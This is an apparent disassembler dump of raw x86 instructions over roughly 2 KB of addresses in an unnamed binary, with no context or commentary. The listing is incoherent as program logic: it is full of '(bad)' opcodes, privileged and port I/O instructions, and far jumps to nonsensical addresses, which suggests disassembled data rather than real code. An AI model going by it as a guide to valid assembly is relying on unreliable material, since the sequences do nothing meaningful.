  411cdf:	add    DWORD PTR [esi+0x30],0xffffffc5
  411ce3:	nop
  411ce4:	into   
  411ce5:	and    eax,0x3b7ac8b5
  411cea:	call   0xc242dbb5
  411cef:	and    eax,0x606ec97e
  411cf4:	outs   dx,DWORD PTR ds:[esi]
  411cf5:	icebp  
  411cf6:	sbb    BYTE PTR ds:0x25da125b,al
  411cfc:	pop    ecx
  411cfd:	inc    ebp
  411cfe:	inc    esp
  411cff:	rcr    esp,0x52
  411d02:	sar    BYTE PTR [edx+ebp*8-0xd],cl
  411d06:	sub    al,0x9c
  411d08:	hlt    
  411d09:	push   ecx
  411d0a:	ret    0xbb94
  411d0d:	and    al,0x31
  411d0f:	(bad)  
  411d10:	test   BYTE PTR cs:[eax+0x5a],0x12
  411d15:	sbb    BYTE PTR [edi-0x98a6a3f],al
  411d1b:	rcr    DWORD PTR [esi+0x2a],0x6
  411d1f:	mov    ebx,0xa337aa27
  411d24:	stc    
  411d25:	lock dec edi
  411d27:	test   al,0x29
  411d29:	mul    DWORD PTR cs:0xa13112cc
  411d30:	cmp    DWORD PTR [edi+0x4a6be04c],esi
  411d36:	jge    0x411ccc
  411d38:	sbb    eax,0x81c85677
  411d3d:	lods   eax,DWORD PTR ds:[esi]
  411d3e:	push   cs
  411d3f:	int3   
  411d40:	js     0x411cfe
  411d42:	xor    ebp,DWORD PTR [eax-0x226acd35]
  411d48:	rcr    BYTE PTR ds:0xf8ef1608,cl
  411d4e:	mov    esp,0x108ecd02
  411d53:	hlt    
  411d54:	inc    edx
  411d55:	fnsave [edi-0x41b2676a]
  411d5b:	cs retf 0x1da4
  411d5f:	mov    esi,0xbcd9cf8b
  411d64:	dec    edx
  411d65:	aam    0x82
  411d67:	das    
  411d68:	pop    eax
  411d69:	daa    
  411d6a:	iret   
  411d6b:	push   es
  411d6c:	stos   BYTE PTR es:[edi],al
  411d6d:	mov    DWORD PTR ds:0x2684d295,eax
  411d73:	mov    WORD PTR [edi+ebp*2-0x25],ss
  411d77:	and    esp,DWORD PTR [ecx-0x4]
  411d7a:	loopne 0x411d7b
  411d7c:	test   eax,0x760de64f
  411d81:	or     esi,edi
  411d83:	push   edi
  411d84:	les    ecx,FWORD PTR [esp+esi*1-0x6a]
  411d88:	clc    
  411d89:	call   0xe589db
  411d8e:	or     al,0xf9
  411d90:	outs   dx,DWORD PTR ss:[esi]
  411d92:	mov    dh,0x45
  411d94:	and    al,BYTE PTR [edx-0x32cfe213]
  411d9a:	mov    esi,0xa7e62061
  411d9f:	addr16 cmp eax,0x710e90d6
  411da5:	push   ds
  411da6:	repnz inc ecx
  411da8:	push   0x54
  411daa:	rcl    BYTE PTR [esi+0x4],cl
  411dad:	or     al,0x6c
  411daf:	ret    0x316c
  411db2:	sahf   
  411db3:	es popf 
  411db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411db6:	mov    ebp,0x6b8e750c
  411dbb:	mov    eax,0x47492a8d
  411dc0:	push   esp
  411dc1:	or     al,BYTE PTR [edx-0x4e2d16f0]
  411dc7:	ins    BYTE PTR es:[edi],dx
  411dc8:	sti    
  411dc9:	(bad)  
  411dca:	jecxz  0x411d55
  411dcc:	enter  0xd0cf,0x84
  411dd0:	xchg   ecx,eax
  411dd1:	retf   0x4f29
  411dd4:	cmp    DWORD PTR [ebp+0x3bcdf26e],esp
  411dda:	test   BYTE PTR [ebp-0x17882757],cl
  411de0:	xchg   BYTE PTR [eax+edi*8-0x3c],ch
  411de4:	xchg   esi,eax
  411de5:	add    eax,0x6c1826c0
  411dea:	fld    TBYTE PTR [ebp-0x6a]
  411ded:	loope  0x411e06
  411def:	pop    ss
  411df0:	xchg   edi,eax
  411df1:	mov    al,0xe
  411df3:	push   ecx
  411df4:	jg     0x411e07
  411df6:	shl    BYTE PTR ds:0xea4e97d7,1
  411dfc:	call   0x2c4e:0x56de497f
  411e03:	mov    ch,0x0
  411e05:	xor    ebx,DWORD PTR [edi-0x6941085e]
  411e0b:	into   
  411e0c:	pop    edi
  411e0d:	pop    ebx
  411e0e:	mov    eax,ds:0xfa8a208b
  411e13:	fdiv   st(6),st
  411e15:	popf   
  411e16:	push   0xffffff9c
  411e18:	repz out dx,al
  411e1a:	in     eax,0xd9
  411e1c:	sub    edx,esp
  411e1e:	jmp    0x411e49
  411e20:	xchg   DWORD PTR [ecx+ebp*8+0x5],ecx
  411e24:	ss pop ebp
  411e26:	in     al,dx
  411e27:	or     al,0x48
  411e29:	push   esp
  411e2a:	add    BYTE PTR [edx+0x14],0xd
  411e2e:	test   eax,0xad7c7f30
  411e33:	jne    0x411e1b
  411e35:	push   esi
  411e36:	mov    BYTE PTR [eax],dl
  411e38:	test   DWORD PTR [eax+0x5fcf6a66],ecx
  411e3e:	in     eax,dx
  411e3f:	sub    eax,0x56b44916
  411e44:	push   ds
  411e45:	xchg   ecx,eax
  411e46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e47:	push   eax
  411e48:	fisttp WORD PTR [esp+ebp*2+0x2e0c9b74]
  411e4f:	jp     0x411eac
  411e51:	mov    BYTE PTR [edx+0x5c74c80],0x9f
  411e58:	mov    ss,WORD PTR [eax+0xd]
  411e5b:	rcl    dl,1
  411e5d:	dec    ebp
  411e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e5f:	sub    eax,0x4a797e6d
  411e64:	scas   al,BYTE PTR es:[edi]
  411e65:	sbb    esp,0xcbde8dca
  411e6b:	ss xor al,0x2e
  411e6e:	jge    0x411ecc
  411e70:	push   ebx
  411e71:	push   DWORD PTR [eax+ebp*1-0x62d496ce]
  411e78:	jmp    0xf62:0x95e6959e
  411e7f:	push   eax
  411e80:	or     esp,esp
  411e82:	pop    ss
  411e83:	mov    cl,BYTE PTR [ebp-0x3bea53cd]
  411e89:	icebp  
  411e8a:	mov    dh,0x18
  411e8c:	pop    ecx
  411e8d:	nop
  411e8e:	fdivr  QWORD PTR [esi+ebx*4+0x6c]
  411e92:	lahf   
  411e93:	lods   al,BYTE PTR ds:[esi]
  411e94:	or     al,0x33
  411e96:	mov    dl,0xb6
  411e98:	in     eax,0x3d
  411e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e9b:	rcr    BYTE PTR [eax+0x7956cd3d],cl
  411ea1:	out    0x1a,eax
  411ea3:	(bad)  
  411ea4:	nop
  411ea5:	sbb    DWORD PTR [ecx-0x7d],edx
  411ea8:	rcl    BYTE PTR ds:0x4b0801c3,0x5f
  411eaf:	adc    al,0x1e
  411eb1:	mov    eax,0x96a89cc4
  411eb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411eb7:	mov    esp,0xb17f064f
  411ebc:	loope  0x411f1f
  411ebe:	xchg   ecx,eax
  411ebf:	jp     0x411eac
  411ec1:	jp     0x411e67
  411ec3:	shl    BYTE PTR [ebp+eiz*4+0x5b],0x64
  411ec8:	push   ds
  411ec9:	mov    ebx,ecx
  411ecb:	xor    dl,bh
  411ecd:	sbb    al,0x60
  411ecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ed0:	jno    0x411f1b
  411ed2:	inc    ebp
  411ed3:	inc    ebp
  411ed4:	cmp    BYTE PTR [edi+ecx*4+0x25],ah
  411ed8:	ror    esi,1
  411eda:	pop    edx
  411edb:	fdivp  st(6),st
  411edd:	adc    BYTE PTR [edi],dl
  411edf:	js     0x411f0b
  411ee1:	and    DWORD PTR [ebx-0x36a5b4a8],edx
  411ee7:	push   edx
  411ee8:	shl    BYTE PTR [ecx+0x7d],1
  411eeb:	xlat   BYTE PTR ds:[ebx]
  411eec:	je     0x411ef6
  411eee:	xchg   esi,eax
  411eef:	cmp    eax,0xc3649fe
  411ef4:	test   BYTE PTR [ebx-0x10],cl
  411ef7:	pop    ebp
  411ef8:	mov    DWORD PTR [esp+ebp*8],ecx
  411efb:	aaa    
  411efc:	test   eax,0x503b1516
  411f01:	cmp    bl,ch
  411f03:	imul   ebp,DWORD PTR [esi],0x55
  411f06:	cli    
  411f07:	push   cs
  411f08:	inc    edx
  411f09:	mov    al,0x3a
  411f0b:	mov    BYTE PTR [ebp+0x3a],ch
  411f0e:	repz xchg esp,eax
  411f10:	mov    ds:0x276c0558,al
  411f15:	mov    esp,0xda697a6b
  411f1a:	fisub  WORD PTR [esp+ebx*8-0xa2fabd5]
  411f21:	adc    BYTE PTR [esi-0x57],cl
  411f24:	mov    ecx,ebx
  411f26:	in     al,0x85
  411f28:	mov    edi,0x72e3d852
  411f2d:	and    DWORD PTR [eax+eax*8],esp
  411f30:	jae    0x411ee9
  411f32:	test   al,0x73
  411f34:	inc    edi
  411f35:	or     al,0xad
  411f37:	dec    esp
  411f38:	sar    ebx,1
  411f3a:	xor    BYTE PTR [eax],bh
  411f3c:	ret    0x1238
  411f3f:	out    dx,eax
  411f40:	pop    edx
  411f41:	addr16 xchg esi,eax
  411f43:	pop    eax
  411f44:	loop   0x411f5a
  411f46:	(bad)  
  411f47:	lahf   
  411f48:	push   ds
  411f49:	lea    ebx,[esi+0x19dff7e5]
  411f4f:	sub    al,0xfa
  411f51:	and    dh,BYTE PTR [ebp+0x73ac7698]
  411f57:	loop   0x411fae
  411f59:	adc    BYTE PTR [edi-0x5fd489cc],0x75
  411f60:	ret    
  411f61:	adc    ch,BYTE PTR [esp+eiz*8-0x4e5b650c]
  411f68:	(bad)  
  411f69:	retf   
  411f6a:	out    0x9e,al
  411f6c:	shr    DWORD PTR [esp+eax*8],cl
  411f6f:	aas    
  411f70:	mov    al,0xb7
  411f72:	or     DWORD PTR [edi-0x788f4cf5],ebp
  411f78:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  411f7a:	and    BYTE PTR [ecx-0x24],al
  411f7d:	fsubr  DWORD PTR [esi+0x124713cd]
  411f83:	pop    ecx
  411f84:	in     eax,dx
  411f85:	and    al,BYTE PTR [eax-0x145ff9f4]
  411f8b:	mov    ah,0x2a
  411f8d:	and    esi,esi
  411f8f:	retf   
  411f90:	and    al,0xa
  411f92:	gs popa 
  411f94:	dec    esi
  411f95:	mov    ah,0x79
  411f97:	push   ecx
  411f98:	and    DWORD PTR [ebx-0x4d],ebx
  411f9b:	lahf   
  411f9c:	adc    DWORD PTR [eax+eax*2-0x5b],esp
  411fa0:	dec    eax
  411fa1:	gs ss (bad) 
  411fa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fa5:	inc    eax
  411fa6:	add    al,0xf9
  411fa8:	(bad)  
  411faa:	ret    0x3645
  411fad:	aaa    
  411fae:	sbb    eax,0x84ae1b88
  411fb3:	es push 0xfa5e9e
  411fb9:	jo     0x411f95
  411fbb:	mov    gs,WORD PTR [ebx+0x6d92a542]
  411fc1:	push   ebx
  411fc2:	jno    0x411f8b
  411fc4:	cwde   
  411fc5:	mov    cl,0x2d
  411fc7:	add    BYTE PTR [ebx-0x359d48a7],dh
  411fcd:	and    eax,0xa539fb96
  411fd2:	xchg   esi,eax
  411fd3:	in     al,dx
  411fd4:	sbb    esi,DWORD PTR [edi]
  411fd6:	inc    edx
  411fd7:	cmp    eax,0x866f56e4
  411fdc:	pop    es
  411fdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fde:	push   edx
  411fdf:	(bad)  
  411fe0:	fbstp  TBYTE PTR [edi]
  411fe2:	sahf   
  411fe3:	and    ebp,DWORD PTR [eax+0x14]
  411fe6:	add    BYTE PTR [ebp-0x29c555cf],dh
  411fec:	push   ss
  411fed:	or     eax,0x3c2adeee
  411ff2:	cmp    BYTE PTR [edi+0x60],ch
  411ff5:	and    esp,DWORD PTR [eax+ebx*4]
  411ff8:	nop
  411ff9:	stos   DWORD PTR es:[edi],eax
  411ffa:	fdivr  QWORD PTR [ecx+edi*8+0x52]
  411ffe:	dec    edi
  411fff:	jno    0x41207a
  412001:	inc    ebp
  412002:	fs fwait
  412004:	mov    esi,0x58dd848c
  412009:	in     al,dx
  41200a:	cmp    ch,BYTE PTR [esi]
  41200c:	mov    bh,dl
  41200e:	xor    eax,0x7028dfd8
  412013:	pop    eax
  412014:	mov    esp,0xbe99eb76
  412019:	fwait
  41201a:	pop    ds
  41201b:	pusha  
  41201c:	ins    BYTE PTR es:[edi],dx
  41201d:	jmp    0x22c3:0x83e26c48
  412024:	adc    al,0x69
  412026:	cmp    DWORD PTR [esi],ebx
  412028:	mov    ds:0x49f8e4c1,eax
  41202d:	in     eax,0x28
  41202f:	mov    dl,ch
  412031:	push   ebx
  412032:	xor    DWORD PTR [ebp-0x54],ebp
  412035:	adc    eax,0x9693c627
  41203a:	rcr    ecx,cl
  41203c:	mov    dl,BYTE PTR [ebx]
  41203e:	out    dx,al
  41203f:	mov    ch,0x8d
  412041:	jo     0x41203c
  412043:	cmp    ah,BYTE PTR [ecx-0x6c]
  412046:	push   0x18
  412048:	ret    
  412049:	or     DWORD PTR [ebx+0x5e],ebx
  41204c:	cmp    DWORD PTR [esi],esi
  41204e:	inc    ebp
  41204f:	mov    DWORD PTR [esi-0xe0ab647],esi
  412055:	iret   
  412056:	(bad)  
  412057:	scas   eax,DWORD PTR es:[edi]
  412058:	push   ss
  412059:	inc    esi
  41205a:	fwait
  41205b:	inc    ebx
  41205c:	mov    DWORD PTR [eax],esp
  41205e:	test   DWORD PTR [edi+0x4d6b514d],edi
  412064:	aam    0xb2
  412066:	jge    0x412012
  412068:	pop    ss
  412069:	data16 cld 
  41206b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41206c:	(bad)  
  41206d:	imul   esp,DWORD PTR [ebp+0x276ee4d4],0xb3f50280
  412077:	lahf   
  412078:	in     eax,0x57
  41207a:	cld    
  41207b:	jb     0x41203c
  41207d:	retf   
  41207e:	adc    ebp,DWORD PTR [ebp+0x21]
  412081:	loope  0x4120bf
  412083:	or     BYTE PTR [eax-0x6fab88dc],dl
  412089:	popa   
  41208a:	(bad)  
  41208b:	(bad)  [eax-0x34]
  41208e:	std    
  41208f:	pop    edx
  412090:	xchg   ebp,eax
  412091:	cwde   
  412092:	push   es
  412093:	xchg   esi,eax
  412094:	and    BYTE PTR [ebx],cl
  412096:	ficomp DWORD PTR [edx-0x130b3dfb]
  41209c:	dec    ebx
  41209d:	stos   BYTE PTR es:[edi],al
  41209e:	ret    
  41209f:	int    0xf3
  4120a1:	push   es
  4120a2:	(bad)  
  4120a3:	(bad)  
  4120a4:	pop    ds
  4120a5:	and    eax,0xd8473e3e
  4120aa:	sbb    eax,0x5adf8bb1
  4120af:	and    ch,BYTE PTR [esi]
  4120b1:	fidiv  WORD PTR fs:[edi+0x64af65ab]
  4120b8:	je     0x412076
  4120ba:	pop    esp
  4120bb:	repnz pushf 
  4120bd:	adc    al,0xc5
  4120bf:	sar    DWORD PTR [ecx-0x44],0xd0
  4120c3:	sub    eax,0x91b9e340
  4120c8:	sti    
  4120c9:	sub    BYTE PTR [esi+esi*4+0x15],0x3b
  4120ce:	fwait
  4120cf:	xchg   esi,eax
  4120d0:	add    ecx,DWORD PTR [ecx]
  4120d2:	mov    al,0x74
  4120d4:	cli    
  4120d5:	add    dh,BYTE PTR ss:[esi+ebx*2+0x9199e49]
  4120dd:	iret   
  4120de:	popf   
  4120df:	push   0xffffffbc
  4120e1:	call   0x7f56025f
  4120e6:	test   DWORD PTR [eax],ebp
  4120e8:	loope  0x4120e9
  4120ea:	add    dl,ah
  4120ec:	mov    ds:0xf2da93ea,al
  4120f1:	out    0x35,al
  4120f3:	mov    dl,0x55
  4120f5:	xlat   BYTE PTR ds:[ebx]
  4120f6:	jl     0x412164
  4120f8:	xchg   ecx,eax
  4120f9:	or     ah,ah
  4120fb:	pop    eax
  4120fc:	sub    DWORD PTR [ebx-0x60],0xdda80776
  412103:	cmp    DWORD PTR [ebp+0x1844de06],0xaa6ac1bf
  41210d:	aam    0x4b
  41210f:	pop    ss
  412110:	out    dx,eax
  412111:	shr    BYTE PTR [ebx],cl
  412113:	repnz test eax,0x7653380f
  412119:	imul   edx,DWORD PTR [edx],0x49
  41211c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41211d:	(bad)
  412120:	sub    edi,DWORD PTR [edi-0x386cfada]
  412126:	push   cs
  412127:	jne    0x412176
  412129:	hlt    
  41212a:	push   ds
  41212b:	push   edx
  41212c:	sub    eax,0x7109250c
  412131:	add    ebp,DWORD PTR [ebp+0x5af720c]
  412137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412138:	xor    ch,ah
  41213a:	mov    ds:0x64b0ecf3,al
  41213f:	mov    esp,0x87c5a37
  412144:	aaa    
  412145:	pop    eax
  412146:	(bad)  
  412147:	loopne 0x412192
  412149:	and    ebp,DWORD PTR [edx+0x1e]
  41214c:	retf   
  41214d:	test   al,0x4
  41214f:	pop    es
  412150:	sbb    eax,0x9e13d7c1
  412155:	or     eax,0xdbb70c9
  41215a:	fld    TBYTE PTR [edi]
  41215c:	pop    ecx
  41215d:	or     eax,0x66f58cd4
  412162:	out    0xe6,eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	mov    dh,0x10
  412167:	cdq    
  412168:	jb     0x4121ab
  41216a:	add    al,0x8a
  41216c:	out    0x34,eax
  41216e:	sahf   
  41216f:	add    al,0x9
  412171:	fs dec ebp
  412173:	jne    0x412176
  412175:	jg     0x4121e7
  412177:	inc    esp
  412178:	and    dh,BYTE PTR [esi]
  41217a:	sbb    ebx,DWORD PTR [edi-0x6b]
  41217d:	xor    al,0x1
  41217f:	mov    ecx,0x8119425a
  412184:	or     ebp,DWORD PTR [ebp+0x64]
  412187:	or     eax,0xef1acfc7
  41218c:	es sub esi,esi
  41218f:	shl    BYTE PTR [ebp-0x10],cl
  412192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412193:	add    al,0xe7
  412195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412196:	push   esp
  412197:	(bad)  
  412198:	jmp    0xece8:0x4d8f6ee1
  41219f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121a0:	scas   eax,DWORD PTR es:[edi]
  4121a1:	cmp    DWORD PTR [ebx],edx
  4121a3:	retf   
  4121a4:	or     ecx,DWORD PTR gs:[ebx-0x396c543a]
  4121ab:	jb     0x4121cc
  4121ad:	and    eax,0x86c532a1
  4121b2:	out    dx,eax
  4121b3:	add    ebp,esp
  4121b5:	mov    dh,0x92
  4121b7:	sbb    eax,0x6cbb7255
  4121bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121bd:	test   eax,0x924319ed
  4121c2:	addr16 add eax,0xf4ae6388
  4121c8:	pop    ebx
  4121c9:	cmp    ch,dh
  4121cb:	mov    edx,?
  4121cd:	inc    ebx
  4121ce:	dec    ebx
  4121cf:	repz jno 0x412237
  4121d2:	sub    esp,edx
  4121d4:	ds push 0xffffffff
  4121d7:	inc    ebp
  4121d8:	mov    ebp,0x20ba5ac1
  4121dd:	cli    
  4121de:	inc    ecx
  4121df:	add    eax,0x64b1606
  4121e4:	dec    ecx
  4121e5:	or     edx,esp
  4121e7:	imul   ebp,DWORD PTR [edi-0x5f],0xffffffeb
  4121eb:	leave  
  4121ec:	dec    ebp
  4121ed:	mov    ah,0x34
  4121ef:	jl     0x412258
  4121f1:	shl    bl,0xd1
  4121f4:	cmp    eax,0x61c33cff
  4121f9:	push   eax
  4121fa:	shl    BYTE PTR ds:[eax+0x17997462],cl
  412201:	sub    al,0xfe
  412203:	test   DWORD PTR [eax-0x7c323ec8],esi
  412209:	dec    ebp
  41220a:	push   0xffffffcd
  41220c:	jp     0x4121b3
  41220e:	sbb    DWORD PTR [edi-0xc3ec4c],eax
  412214:	or     eax,0xd5d1444b
  412219:	sub    ecx,DWORD PTR ds:0x1bb0b2e8
  41221f:	jo     0x4121a9
  412221:	lds    ebp,FWORD PTR [eax-0x5f2ee767]
  412227:	jle    0x4121ad
  412229:	into   
  41222a:	mov    eax,ds:0x6dfa6929
  41222f:	xchg   edx,eax
  412230:	ret    0x7308
  412233:	or     ch,bh
  412235:	mov    ch,BYTE PTR [edx-0x26]
  412238:	or     eax,0x7907023e
  41223d:	enter  0x95c0,0x53
  412241:	repnz stos DWORD PTR es:[edi],eax
  412243:	push   ds
  412244:	pop    ebp
  412245:	jmp    0x412285
  412247:	jge    0x412220
  412249:	add    ch,BYTE PTR [ecx-0x7e]
  41224c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41224d:	jg     0x412266
  41224f:	mov    ah,0x2c
  412251:	jnp    0x412284
  412253:	outs   dx,BYTE PTR ds:[esi]
  412254:	adc    BYTE PTR [edi-0x54cff244],al
  41225a:	fbstp  TBYTE PTR [esi+0x48]
  41225e:	les    eax,FWORD PTR ds:0x10c75ef
  412264:	dec    esi
  412265:	jle    0x4121fa
  412267:	push   0xffffff84
  412269:	push   eax
  41226a:	fstp   DWORD PTR [edx-0x24]
  41226d:	enter  0xa03d,0x12
  412271:	cmp    BYTE PTR [ebx+esi*2],bl
  412274:	fild   DWORD PTR [eax-0x2]
  412277:	(bad)  
  412278:	jmp    0x41fd:0x92f646b
  41227f:	pop    es
  412280:	add    eax,ebp
  412282:	scas   al,BYTE PTR es:[edi]
  412283:	ss xor bl,al
  412286:	imul   edx,edx,0xd736429e
  41228c:	clc    
  41228d:	imul   ecx,ecx,0xffffffc0
  412290:	test   eax,0xd7fa5381
  412295:	ds dec edx
  412297:	xchg   ebx,eax
  412298:	push   ecx
  412299:	scas   eax,DWORD PTR es:[edi]
  41229a:	add    al,0x9f
  41229c:	rcr    dh,0xc7
  41229f:	xor    al,0x67
  4122a1:	xchg   esp,eax
  4122a2:	int3   
  4122a3:	(bad)  
  4122a4:	dec    ebp
  4122a5:	and    eax,0x3f781fad
  4122aa:	into   
  4122ab:	stc    
  4122ac:	push   ecx
  4122ad:	mov    dh,0x35
  4122af:	jno    0x4122ea
  4122b1:	sbb    esi,DWORD PTR [esi]
  4122b3:	lea    esi,[edi]
  4122b5:	scas   al,BYTE PTR es:[edi]
  4122b6:	or     al,0x3b
  4122b8:	jne    0x41231a
  4122ba:	xor    esp,ecx
  4122bc:	lock popa 
  4122be:	int3   
  4122bf:	das    
  4122c0:	and    al,0xea
  4122c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122c3:	xchg   esp,eax
  4122c4:	jmp    0x8548:0x2fb532b8
  4122cb:	add    DWORD PTR [ebx],edi
  4122cd:	lds    edi,FWORD PTR [ecx-0x4fdc6d8f]
  4122d3:	cli    
  4122d4:	mov    ch,BYTE PTR [edx+0x1c]
  4122d7:	call   0x9ce892eb
  4122dc:	mov    bl,BYTE PTR ss:[eax]
  4122df:	into   
  4122e0:	dec    eax
  4122e1:	mov    esi,0x8b018f45
  4122e6:	fidivr WORD PTR [ebx+0xeb33705]
  4122ec:	popa   
  4122ed:	jmp    0xf8e78e02
  4122f2:	mov    bh,al
  4122f4:	sti    
  4122f5:	cmp    esi,ebp
  4122f7:	xor    esi,DWORD PTR [edx+eax*1]
  4122fa:	bound  ebp,QWORD PTR [eax]
  4122fc:	pop    ds
  4122fd:	outs   dx,DWORD PTR ds:[esi]
  4122fe:	loope  0x41234b
  412300:	mov    ah,0xfc
  412302:	xchg   edi,eax
  412303:	mov    esp,0x286e91af
  412308:	push   0x5f754c84
  41230d:	ins    BYTE PTR es:[edi],dx
  41230e:	scas   eax,DWORD PTR es:[edi]
  41230f:	mov    eax,0xec4c2316
  412314:	push   esp
  412315:	shl    BYTE PTR [esi],1
  412317:	sbb    eax,esp
  412319:	sub    al,0x9e
  41231b:	imul   edi,DWORD PTR [ebp+0x1e],0xb086efbe
  412322:	enter  0x53e4,0x68
  412326:	sbb    dl,dh
  412328:	bound  ebx,QWORD PTR [eax]
  41232a:	pop    ss
  41232b:	sbb    eax,0x6208fb09
  412330:	imul   esp,DWORD PTR [edx+0x5],0x3f
  412334:	bound  edx,QWORD PTR [ecx-0x1e76725]
  41233a:	loope  0x41233a
  41233c:	outs   dx,BYTE PTR ds:[esi]
  41233d:	mov    ebx,0x21fb5374
  412342:	xchg   ebx,eax
  412343:	push   edx
  412344:	mov    ebx,0x6b747491
  412349:	(bad)  
  41234a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41234b:	fwait
  41234c:	push   esp
  41234d:	push   ss
  41234e:	adc    DWORD PTR [ebp-0x5d],edi
  412351:	mov    ecx,0x33a2039f
  412356:	loope  0x412363
  412358:	xchg   esp,eax
  412359:	cdq    
  41235a:	and    DWORD PTR [edi+0x34],0x480d574f
  412361:	popa   
  412362:	dec    eax
  412363:	pop    esp
  412364:	(bad)  
  412365:	cmc    
  412366:	icebp  
  412367:	out    dx,al
  412368:	scas   al,BYTE PTR es:[edi]
  412369:	jle    0x412374
  41236b:	xor    dh,BYTE PTR [bx+0x28]
  41236f:	ja     0x412331
  412371:	sbb    ecx,DWORD PTR [ebp+0x67f2bfb1]
  412377:	jae    0x412361
  412379:	jle    0x4123d4
  41237b:	stos   BYTE PTR es:[edi],al
  41237c:	push   esp
  41237d:	jecxz  0x4123d9
  41237f:	pop    edi
  412380:	mov    esp,0xa149b14c
  412385:	lods   al,BYTE PTR ds:[esi]
  412386:	mov    ds,WORD PTR [ebx]
  412388:	cmp    ebx,DWORD PTR [edi+ebp*2+0x3d]
  41238c:	sub    DWORD PTR [ebx],0x4d
  41238f:	xchg   edi,eax
  412390:	icebp  
  412391:	ins    BYTE PTR es:[edi],dx
  412392:	push   0x13308e4c
  412397:	(bad)  
  412398:	xor    BYTE PTR [edx+0x3c7b360d],cl
  41239e:	mov    WORD PTR [ebx+0x38],cs
  4123a1:	sbb    esi,ebx
  4123a3:	pop    edi
  4123a4:	mov    esp,0xb70b4467
  4123a9:	out    0x6e,al
  4123ab:	out    0x6f,eax
  4123ad:	xor    dh,BYTE PTR [esi+0x1d133e7d]
  4123b3:	pmaxub mm7,mm3
  4123b6:	cs mov edi,0x10bd72f2
  4123bc:	and    BYTE PTR [edx-0x34],ah
  4123bf:	dec    ebp
  4123c0:	sbb    ch,BYTE PTR [ebx]
  4123c2:	fcom   DWORD PTR [ecx+esi*8+0x7aee6776]
  4123c9:	and    DWORD PTR [edi+0x56],esp
  4123cc:	and    al,0xd6
  4123ce:	jecxz  0x4123f8
  4123d0:	addr16 fwait
  4123d2:	or     ecx,DWORD PTR ss:[edi+0x7b7ed9d4]
  4123d9:	or     BYTE PTR [edi],al
  4123db:	xor    BYTE PTR [ebp+0xc],bh
  4123de:	test   DWORD PTR [esp+eax*1+0x3fbd5605],edi
  4123e5:	in     al,dx
  4123e6:	out    dx,eax
  4123e7:	leave  
  4123e8:	loope  0x4123ae
  4123ea:	mov    ds:0xe1cb6e14,eax
  4123ef:	mov    esp,0x37f99a00
  4123f4:	jbe    0x4123e0
  4123f6:	pop    ebp
  4123f7:	or     bh,ah
  4123f9:	daa    
  4123fa:	sub    eax,DWORD PTR [edi]
  4123fc:	aas    
  4123fd:	in     eax,dx
  4123fe:	ficom  DWORD PTR [eax+0x14105734]
  412404:	add    DWORD PTR [ebx+0x5a595622],0xf9166d34
  41240e:	add    eax,0xf5471832
  412413:	push   ss
  412414:	dec    eax
  412415:	mov    ah,0xa8
  412417:	lods   eax,DWORD PTR ds:[esi]
  412418:	fs pop es
  41241a:	cmp    eax,ebp
  41241c:	ret    
  41241d:	mov    esi,0x900b3969
  412422:	push   edx
  412423:	clc    
  412424:	mov    al,0x4b
  412426:	jmp    0xea2f:0xcf4273c5
  41242d:	test   BYTE PTR [esi],0xaa
  412430:	xor    DWORD PTR [eax],edx
  412432:	mov    ebx,0x74008cdb
  412437:	lds    esp,FWORD PTR [ebp+eiz*8-0x6f]
  41243b:	enter  0x2dff,0xaa
  41243f:	sub    bl,BYTE PTR [edx+0x77]
  412442:	std    
  412443:	int3   
  412444:	xchg   esp,eax
  412445:	mov    al,ds:0xaa65842a
  41244a:	lea    esp,[ecx+0x492d0828]
  412450:	pop    edi
  412451:	inc    ebx
  412452:	pop    ds
  412453:	jmp    0xdc97:0xc7399c8b
  41245a:	rcl    bh,0x57
  41245d:	cmp    eax,DWORD PTR [ecx+0x6ce2e643]
  412463:	mov    esp,0xa9b587f3
  412468:	and    DWORD PTR [esp+ebx*1-0x3],edi
  41246c:	jmp    0x412432
  41246e:	ss cmp al,0x28
  412472:	ja     0x4124a8
  412474:	sub    DWORD PTR [esp+eax*4-0x3e04ff77],esp
  41247b:	(bad)
  41247e:	test   al,0x16
  412480:	pop    ss
  412481:	test   DWORD PTR [edi-0x5a3ffd9a],ebp
  412487:	jg     0x4124c9
  412489:	sub    al,0x6a
  41248b:	iret   
  41248c:	ucomiss xmm4,xmm2
  41248f:	inc    edx
  412490:	stos   BYTE PTR es:[edi],al
  412491:	dec    ebp
  412492:	(bad)  
  412493:	sub    ecx,ecx
  412495:	(bad)  
  412496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412497:	xor    al,0xfd
  412499:	dec    edi
  41249a:	rcl    BYTE PTR [ebp+0x27],cl
  41249d:	xor    bl,BYTE PTR [esi]
  41249f:	(bad)  
  4124a0:	bound  eax,QWORD PTR [esi+0x68610c90]
  4124a6:	xchg   bl,dl
  4124a8:	xchg   ecx,eax
  4124a9:	pop    ebx
  4124aa:	shl    BYTE PTR [edx-0x6e],cl
  4124ad:	cmp    bl,bl
  4124af:	jae    0x4124f8
  4124b1:	add    al,0x8c
  4124b3:	cmp    al,0x4d
  4124b5:	fstp   DWORD PTR [edi-0x74]
  4124b8:	push   cs
  4124b9:	pusha  
  4124ba:	out    0x1b,al
  4124bc:	aam    0xf9
  4124be:	scas   al,BYTE PTR es:[edi]
